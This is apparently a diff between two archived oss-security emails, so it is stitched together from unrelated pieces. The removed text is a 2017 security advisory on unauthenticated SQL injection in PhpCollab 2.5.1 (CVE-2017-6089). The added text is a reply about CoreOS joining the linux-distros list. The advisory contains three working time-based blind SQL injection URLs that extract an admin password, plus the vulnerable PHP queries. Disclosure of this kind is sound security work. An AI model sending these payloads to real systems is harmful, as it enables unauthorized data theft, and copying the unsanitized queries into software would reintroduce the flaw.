@@ -1,138 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/29/6
-Message-ID: <e40934eb-c030-dc42-3a21-6f50daa62159@sysdream.com>
-Date: Fri, 29 Sep 2017 16:30:10 +0200
-From: Sysdream Labs <labs@...dream.com>
-To: fulldisclosure@...lists.org
-Cc: oss-security@...ts.openwall.com
-Subject: [CVE-2017-6089] PhpCollab 2.5.1 Multiple SQL Injections (unauthenticated)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/20/4
+Message-ID: <20170720041303.GA4266@gremlin.ru>
+Date: Thu, 20 Jul 2017 07:13:03 +0300
+From: gremlin@...mlin.ru
+To: oss-security@...ts.openwall.com
+Subject: Re: CoreOS membership to linux-distros (updated)
 Content-Type: text/plain; charset=utf-8
 
-# [CVE-2017-6089] PhpCollab 2.5.1 Multiple SQL Injections (unauthenticated)
+On 2017-07-18 14:56:23 -0700, Euan Kemp wrote:
 
-## Description
+ > I???ve listed each criterion and why I think we, the Container
+ > Linux team at CoreOS, qualify.
+ >
+ >
+ >> 1. Be an actively maintained Unix-like operating system distro
+ >> with substantial use of Open Source components
+ > All components of the distro are open source, as are all the
+ > tools used to build it.
 
-PhpCollab is an open source web-based project management system, that enables collaboration across the Internet.
+Prior to any decision to be made, I'd ask you to show the kernel
+patch which you use to avoid escaping from the container to host
+system (Docker allows such escape, OpenVZ does not). Could you,
+please, show it?
 
-## SQL injections
-
-The phpCollab code does not correctly filter arguments, allowing arbitrary SQL code execution by an unauthenticated user.
-
-**CVE ID**: CVE-2017-6089
-
-**Access Vector**: remote
-
-**Security Risk**: Critical
-
-**Vulnerability**: CWE-89
-
-**CVSS Base Score**: 10 (Critical)
-
-**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:H
-
-## Proof of Concept 1
-
-The following HTTP request allows an attacker to extract data using SQL injections in either the `project` or `id` parameter  (it requires at least one topic):
-
-```
-http://phpCollab.lan/topics/deletetopics.php?project=1'+and+(SELECT+SLEEP(5)+FROM+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116))+and+'2'='2
-
-http://phpCollab.lan/topics/deletetopics.php?project=1&id=1+and+(SELECT+SLEEP(5)+FROM+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116))
-```
-
-### Vulnerable code
-
-The vulnerable code is found in `topics/deletetopics.php`, line 9.
-
-```
-if ($action == "delete") {
-    $id = str_replace("**",",",$id);
-    $tmpquery1 = "DELETE FROM ".$tableCollab["topics"]." WHERE id = $id";
-    $tmpquery2 = "DELETE FROM ".$tableCollab["posts"]." WHERE topic = $id";
-    $pieces = explode(",",$id);
-    $num = count($pieces);
-    connectSql("$tmpquery1");
-    connectSql("$tmpquery2");
-```
-
-
-## Proof of Concept 2
-
-The following HTTP request allows an attacker to extract data using SQL injections in the `id` parameter (it requires at least one saved bookmark):
-
-```
-http://phpCollab.lan/bookmarks/deletebookmarks.php?action=delete&id=select+sleep(5)+from+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116)
-```
-
-### Vulnerable code
-
-The vulnerable code is found in `bookmarks/deletebookmarks.php`, line 32.
-
-```
-if ($action == "delete") {
-	$id = str_replace("**",",",$id);
-	$tmpquery1 = "DELETE FROM ".$tableCollab["bookmarks"]." WHERE id IN($id)";
-	connectSql("$tmpquery1");
-```
-
-
-## Proof of Concept 3
-
-The following HTTP request allows an attacker to extract some information using SQL injection in the `id` parameter (it requires at least one calendar entry):
-
-```
-http://phpCollab.lan/calendar/deletecalendar.php?project=&action=delete&id=select+sleep(5)+from+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116)
-```
-
-### Vulnerable code
-
-The vulnerable code is found in `calendar/deletecalendar.php`, line 31.
-
-```
-if ($action == "delete") {
-	$id = str_replace("**",",",$id);
-	$tmpquery1 = "DELETE FROM ".$tableCollab["calendar"]." WHERE id IN($id)";
-	connectSql("$tmpquery1");
-```
-
-**Notes**
-The application probably needs a security posture against injections, so other parameters and pages may be vulnerables. This advisory does not intend to be an exhaustive list of vulnerable parameters.
-
-
-## Solution
-
-Update to the latest version avalaible.
-
-## Affected versions
-
-* Version <= 2.5.1
-
-## Timeline (dd/mm/yyyy)
-
-* 27/08/2016 : Initial discovery.
-* 05/10/2016 : Initial contact.
-* 11/10/2016 : GPG Key exchange.
-* 19/10/2016 : Advisory sent to vendor.
-* 13/02/2017 : First fixes.
-* 15/02/2017 : Fixes validation by Sysdream.
-* 21/02/2017 : PhpCollab ask to wait before publish.
-* 21/06/2017 : New version has been released.
-* 29/09/2017 : Public disclosure.
-
-## Credits
-
-* Nicolas SERRA, Sysdream  (n.serra -at- sysdream -dot- com)
 
 -- 
-SYSDREAM Labs <labs@...dream.com>
+Alexey V. Vissarionov aka Gremlin from Kremlin
+GPG: 8832FE9FA791F7968AC96E4E909DAC45EF3B1FA8
 
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+Content of type "application/pgp-signature" skipped
